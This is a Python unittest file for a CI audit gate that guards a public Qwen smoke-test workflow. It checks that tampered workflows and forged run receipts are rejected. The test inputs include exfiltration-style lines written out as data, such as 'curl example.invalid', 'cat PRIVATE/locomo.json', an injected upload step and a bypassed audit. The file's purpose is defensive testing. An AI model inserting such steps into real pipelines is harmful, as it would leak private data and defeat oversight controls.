"""Source-only fail-closed regressions; no pretrained model inference."""
from __future__ import annotations
import ast
import copy
from pathlib import Path
import unittest
from unittest.mock import patch

from v26_public_smoke_audit import (
    CHECK_STEP, STEP_NAMES, audit_workflow, strict_json, validate_observed_receipt,
)

ROOT = Path(__file__).resolve().parents[2]
FLOW = ROOT / '.github/workflows/hepta-stem-v18-qwen-public-smoke.yml'
CODE = Path(__file__).resolve().parent / 'v18_reference_public_smoke.py'
RECEIPT = Path(__file__).resolve().parent / 'V26_PUBLIC_QWEN_ORIGINAL_FORWARD_20261016.json'

class PublicQwenPhysicalContracts(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.flow = FLOW.read_text()
        cls.source = CODE.read_text()
        cls.receipt = strict_json(RECEIPT)

    def check(self, workflow=None, source=None):
        return audit_workflow(self.flow if workflow is None else workflow,
                              self.source if source is None else source)

    def test_observed_public_physical_forward_is_not_a_successful_workflow(self):
        r = validate_observed_receipt(self.receipt)
        self.assertEqual(r['original_128_model_requests'], 0)
        self.assertFalse(r['production_authorized'])
        self.assertEqual(self.receipt['github_job_conclusion'], 'failure')

    def test_structural_gate_ignores_its_own_semantic_literals(self):
        result = self.check()
        self.assertIn(result['status'], ('STRUCTURED_SOURCE_ONLY_NO_UPLOAD_GATE_VALID',
                                        'BYTE_FROZEN_SOURCE_ONLY_NO_UPLOAD_GATE_VALID'))

    def test_no_extra_job_or_upload_action(self):
        for changed in (
            self.flow + "\n  other:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/upload-artifact@v4\n",
            self.flow + "\n      - uses: actions/upload-artifact@v4\n",
        ):
            with self.subTest(change=changed[-90:]), self.assertRaises(ValueError):
                self.check(changed)

    def test_modified_action_is_denied(self):
        changed = self.flow.replace('uses: actions/checkout@v4', 'uses: actions/upload-artifact@v4')
        self.assertNotEqual(changed, self.flow)
        with self.assertRaises(ValueError):self.check(changed)

    def test_exfiltration_via_inline_command_rejected(self):
        target = '          python qualification/stem-cell-v1/v18_reference_public_smoke.py'
        self.assertIn(target, self.flow)
        changed = self.flow.replace(target, '          gh api upload-artifact\n' + target)
        with self.assertRaises(ValueError):self.check(changed)

    def test_data_egress_from_public_job_rejected(self):
        target = '      - name: Exercise actual pinned Transformers Qwen3 constructor with tiny synthetic weights'
        self.assertIn(target,self.flow)
        changed = self.flow.replace(target,'          cat PRIVATE/locomo.json\n'+target)
        with self.assertRaises(ValueError):self.check(changed)

    def test_altered_final_audit_denied(self):
        target = '          python qualification/stem-cell-v1/v26_public_smoke_audit.py'
        self.assertIn(target,self.flow)
        with self.assertRaises(ValueError):self.check(self.flow.replace(target,'          true # bypass audit'))

    def test_appended_upload_after_final_guard_rejected(self):
        changed = self.flow + '\n          echo EXFILTRATE; curl example.invalid\n'
        with self.assertRaises(ValueError):self.check(changed)

    def test_write_access_denied(self):
        target='  contents: read'
        self.assertIn(target,self.flow)
        with self.assertRaises(ValueError):self.check(self.flow.replace(target,'  contents: write'))

    def test_no_external_yaml_dependency(self):
        # Exact frozen byte identity remains enforced in the stdlib-only matrix.
        with patch.dict('sys.modules', {'yaml': None}):
            result = self.check()
            self.assertEqual(result['status'],'BYTE_FROZEN_SOURCE_ONLY_NO_UPLOAD_GATE_VALID')
            with self.assertRaises(ValueError):self.check(self.flow+'\n# changed\n')

    def test_no_attention_mask_denied(self):
        changed = self.source.replace('attention_mask=attention_mask,', '')
        self.assertNotEqual(changed, self.source)
        with self.assertRaises(ValueError): self.check(source=changed)

    def test_no_go_authority_flags_remain_false(self):
        for field in ('production_authorized','original_task_gain_verified','independent_host_attestation'):
            fake = copy.deepcopy(self.receipt)
            fake[field] = True
            with self.subTest(field=field), self.assertRaises(ValueError):
                validate_observed_receipt(fake)

    def test_128_original_reference_claim_rejected(self):
        fake = copy.deepcopy(self.receipt)
        fake['original_128_reference_requests'] = 128
        with self.assertRaises(ValueError):validate_observed_receipt(fake)

    def test_missing_original_observation_rejected(self):
        fake = copy.deepcopy(self.receipt)
        fake['pretrained_generation_step_conclusion'] = 'skipped'
        with self.assertRaises(ValueError):validate_observed_receipt(fake)

    def test_nonfinite_cost_rejected(self):
        fake = copy.deepcopy(self.receipt)
        fake['generation_cpu_seconds'] = float('nan')
        with self.assertRaises(ValueError):validate_observed_receipt(fake)

    def test_forged_source_sha_denied(self):
        fake = copy.deepcopy(self.receipt)
        fake['exact_source_head'] = '0'*40
        with self.assertRaises(ValueError):validate_observed_receipt(fake)

    def test_ast_source_is_real_python(self):
        self.assertIsInstance(ast.parse(self.source), ast.Module)

if __name__=='__main__': unittest.main()
